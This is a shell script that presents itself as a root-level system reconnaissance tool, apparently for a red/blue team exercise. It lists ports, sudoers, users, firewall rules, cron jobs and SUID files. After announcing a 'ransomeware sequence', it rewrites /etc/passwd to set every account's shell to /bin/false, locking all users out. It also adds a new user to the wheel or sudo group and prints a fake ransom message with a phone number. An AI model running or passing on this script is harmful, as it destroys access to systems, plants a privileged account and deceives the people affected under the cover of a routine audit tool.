#!/bin/sh

printf "▗▄▄▖ ▗▄▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖    ▗▄▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▖ \n";
printf "▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌      █  ▐▌   ▐▛▚▞▜▌▐▌ ▐▌\n";
printf "▐▛▀▚▖▐▛▀▀▘▐▌   ▐▌ ▐▌▐▌ ▝▜▌      █  ▐▛▀▀▘▐▌  ▐▌▐▛▀▘ \n";
printf "▐▌ ▐▌▐▙▄▄▖▝▚▄▄▖▝▚▄▞▘▐▌  ▐▌      █  ▐▙▄▄▖▐▌  ▐▌▐▌   \n\n";

###########################################
#---------------) Colors (----------------#
###########################################
C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
RED_YELLOW="${C}[1;31;103m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" #LightGray
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m" #DarkGray
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

if ! [ $(id -u) = 0 ]; then
   echo "Rerun with sudo"
   exit 1
fi
busctl --system set-property org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager ConnectivityCheckEnabled "b" 0

printf ${BLUE}
echo "=== OS Version ==="
uname -a
printf ${NC}
echo
printf ${LIGHT_CYAN}
echo "=== Open Ports ==="
sudo ss -tulpn
printf ${NC}
echo
printf ${YELLOW}
echo "=== Sudoers ==="
grep -Po '^sudo.+:\K.*$' /etc/group
grep -Po '^wheel.+:\K.*$' /etc/group
printf ${NC}
echo
printf ${GREEN}
echo "=== All users with shell ==="
getent passwd | awk -F: '$7 !~ /(nologin|false|sync|halt|shutdown)$/ {print $1, $7}'
printf ${NC}
echo
printf ${LG}
echo "=== Current iptable rules ==="
sudo iptables -L
printf ${NC}
echo
printf ${BLUE}
echo "=== Cronjobs ==="
users=$(cut -f1 -d: /etc/passwd)
for u in $users
do
  echo "---[ USER: $u ]---"
  crontab -l -u "$u" 2>/dev/null 
done
sudo crontab -l
cat /etc/cron*/*
printf "${NC}\n"
printf "=== Running Systemd Services ===\n"
systemctl list-units --type=service --no-pager
printf ${RED_YELLOW}
echo "=== SUID bits ==="
sudo find / -perm "/u=s,g=s" -type f 2>/dev/null
printf ${NC}
echo



printf "Shaw!\n"
printf "Adino!\n"
printf "Hegale!\n"
printf "Git gut @redteam\n"

printf "Initiating ransomeware sequence 🧬🧬🧬\n"

# Sets all users to login
sudo sed -ri 's@(:[^:]*$)@:/bin/false@' /etc/passwd
# Add blueteam user
sudo useradd bluey -m
if getent group wheel >/dev/null; then 
   sudo usermod -aG wheel bluey
else
   sudo usermod -aG sudo bluey
fi


printf "Encryption completed.\n"
printf "To gain access to your data, call 1-800-GOT-SCAM\n"
